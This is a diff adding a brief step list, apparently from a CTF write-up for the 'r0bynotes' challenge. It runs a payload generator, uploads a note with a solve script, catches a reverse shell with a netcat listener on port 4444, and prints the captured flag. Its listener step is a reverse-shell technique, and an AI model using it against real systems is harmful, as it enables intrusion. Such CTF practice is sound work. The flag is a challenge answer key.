@@ -1,0 +1,13 @@
+Source: https://flagbot.ch/posts/r0bynotes/
+
+Step 1: Create payload
+	ruby create_payload.rb
+Step 2: Upload note
+	python3 solve.py
+Step 3: Listen in local
+	nc -lvnp 4444
+Step 4: Access the note
+	https://r0bynotes.chal.perfect.blue/notes/xxxxxx
+
+And get flag
+	flag{wh3n_c0un7_d035n7_c0un7}
